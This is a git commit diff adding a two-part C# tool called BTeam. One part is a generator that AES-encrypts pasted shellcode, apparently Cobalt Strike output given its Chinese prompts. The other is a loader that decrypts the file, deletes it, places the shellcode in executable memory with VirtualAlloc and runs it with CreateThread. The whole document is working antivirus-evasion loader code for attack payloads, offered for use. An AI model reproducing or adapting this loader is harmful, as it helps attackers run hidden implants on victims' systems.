88b4e12eda9132ac9eb05bdefad80a3cb68eec83
Airevan <876753342@qq.com>
2021-04-17 17:35:19 +0800

    init commit

---
+++ BTeam-Gen/Form1.cs
@@ -0,0 +1,119 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.IO;
+using System.Linq;
+using System.Security.Cryptography;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+
+namespace BTeam_Gen
+{
+    public partial class Form1 : Form
+    {
+        public static byte[] key = new byte[24];
+        public static byte[] iv = new byte[16];
+        public Form1()
+        {
+            InitializeComponent();
+        }
+
+        private void button1_Click(object sender, EventArgs e)
+        {
+            if(srcText.Text.Length == 0)
+            {
+                MessageBox.Show("老铁，请先输入原始的shellcode。");
+            }
+            else
+            {
+                this.tob64();
+            }
+        }
+
+        private void genAesKey(byte[] data,String secret)
+        {
+            /*
+            int bar = data.Length / 4 + data.Length / 2;
+
+            for (int i = 0; i < key.Length; i++)
+            {
+                key[i] = data[bar + i];
+
+                if (i < iv.Length)
+                {
+                    iv[i] = data[bar + i + 24];
+                }
+            }
+            */
+            String _str = "abcdefghijklmnopqrstuvwxyz;?/][}{+-()*&^%$#@!~,.";
+            Random r = new Random();
+            for(int i=0;i < key.Length; i++)
+            {
+                key[i] = (byte)_str[r.Next(_str.Length)];
+
+                if (i < iv.Length)
+                {
+                    iv[i] = (byte)_str[r.Next(_str.Length)];
+                }
+            }
+            
+            
+            //Environment.Exit(0);
+            String encrypted = EncryptStringToBytes_Aes(secret, key, iv);
+            dstText.Text = encrypted + ":" + System.Text.Encoding.UTF8.GetString(key) + ":" + System.Text.Encoding.UTF8.GetString(iv);
+
+            //Environment.Exit(0);
+        }
+        public void tob64()
+        {
+            String tmp = srcText.Text.Split('{')[1].Split('}')[0];
+            String[] result = tmp.Split(',');
+            byte[] data = new byte[result.Length];
+            try
+            {
+
+
+                for (int i = 0; i < data.Length; i++)
+                {
+                    data[i] = byte.Parse(result[i].Replace("0x", ""), System.Globalization.NumberStyles.HexNumber);
+                }
+
+
+                String b64 = Convert.ToBase64String(data);
+                dstText.Text = b64;
+                this.genAesKey(data, b64);
+            }catch(Exception e)
+            {
+                MessageBox.Show("请输cs原始完整的shellcode。","Warning");
+                Console.WriteLine(e);
+            }
+        }
+
+        static String EncryptStringToBytes_Aes(String plainText, byte[] Key, byte[] Iv)
+        {
+            byte[] encrypted;
+
+            using(Aes aesAlg = Aes.Create()) {
+                aesAlg.Key = Key;
+                aesAlg.IV = Iv;
+
+                ICryptoTransform encryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV);
+                using (MemoryStream msEncrypt = new MemoryStream())
+                {
+                    using(CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
+                    {
+                        using(StreamWriter swEncrypt = new StreamWriter(csEncrypt))
+                        {
+                            swEncrypt.Write(plainText,0,plainText.Length);
+                        }
+                        encrypted = msEncrypt.ToArray();
+                    }
+                }
+            }
+            return Convert.ToBase64String(encrypted);
+        }
+    }
+}
---
+++ BTeam-Loader/Program.cs
@@ -0,0 +1,125 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.IO;
+using System.Threading.Tasks;
+using System.Security.Cryptography;
+
+namespace BTeam_Loader
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            if (args.Length == 0)
+            {
+                Console.WriteLine("The Path cannot be empty");
+                Environment.Exit(0);
+            }
+            if (!File.Exists(args[0]))
+            {
+                Console.WriteLine("FIle Not Exists.");
+                Environment.Exit(0);
+            }
+
+            using (StreamReader fileSR = new StreamReader(args[0]))
+            {
+                String line = null;
+                String data = null;
+
+                while((line = fileSR.ReadLine()) != null)
+                {
+                    data += line;
+                }
+                fileSR.Close();
+                String secret = data.Split(':')[0];
+                byte[] Key = System.Text.Encoding.UTF8.GetBytes(data.Split(':')[1]);
+                byte[] Iv = System.Text.Encoding.UTF8.GetBytes(data.Split(':')[2]);
+                String resultDecrypt = DecryptAesTo_String(secret,Key,Iv);
+
+                byte[] wzqadgmywan = Convert.FromBase64String(resultDecrypt);
+                File.Delete(args[0]);
+                UInt32 funcAddr = VirtualAlloc(0, (UInt32)wzqadgmywan.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+                Marshal.Copy(wzqadgmywan, 0, (IntPtr)(funcAddr), wzqadgmywan.Length);
+                IntPtr hThread = IntPtr.Zero;
+                UInt32 threadId = 0;
+                IntPtr pinfao = IntPtr.Zero;
+                hThread = CreateThread(0, 0, funcAddr, pinfao, 0, ref threadId);
+                WaitForSingleObject(hThread,0xFFFFFFFF);
+            }
+            /*
+                for (int i = 0; i < args.Length; i++)
+                {
+                    Console.WriteLine(args[i]);
+                    Console.ReadKey();
+                }
+            */
+        }
+        static String DecryptAesTo_String(String cipherTextBase, byte[] Key, byte[] Iv)
+        {
+            byte[] cipherText = Convert.FromBase64String(cipherTextBase);
+
+            String plaintext = null;
+            using (Aes aesAlg = Aes.Create()) {
+                aesAlg.Key = Key;
+                aesAlg.IV = Iv;
+
+                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key,aesAlg.IV);
+                using(MemoryStream msDecrypt = new MemoryStream(cipherText))
+                {
+                    using(CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
+                    {
+                        using(StreamReader srDecrypt = new StreamReader(csDecrypt))
+                        {
+                            plaintext = srDecrypt.ReadToEnd();
+                        }
+                    }
+                }
+            }
+            return plaintext;
+        }
+
+
+        private static UInt32 MEM_COMMIT = 0x1000;
+        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
+        [DllImport("kernel32")]
+        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
+        UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
+        [DllImport("kernel32")]
+        private static extern bool VirtualFree(IntPtr lpAddress,
+        UInt32 dwSize, UInt32 dwFreeType);
+        [DllImport("kernel32")]
+        private static extern IntPtr CreateThread(
+        UInt32 lpThreadAttributes,
+        UInt32 dwStackSize,
+        UInt32 lpStartAddress,
+        IntPtr param,
+        UInt32 dwCreationFlags,
+        ref UInt32 lpThreadId
+        );
+        [DllImport("kernel32")]
+        private static extern bool CloseHandle(IntPtr handle);
+        [DllImport("kernel32")]
+        private static extern UInt32 WaitForSingleObject(
+        IntPtr hHandle,
+        UInt32 dwMilliseconds
+        );
+        [DllImport("kernel32")]
+        private static extern IntPtr GetModuleHandle(
+        string moduleName
+        );
+        [DllImport("kernel32")]
+        private static extern UInt32 GetProcAddress(
+        IntPtr hModule,
+        string procName
+        );
+        [DllImport("kernel32")]
+        private static extern UInt32 LoadLibrary(
+        string lpFileName
+        );
+        [DllImport("kernel32")]
+        private static extern UInt32 GetLastError();
+    }
+}
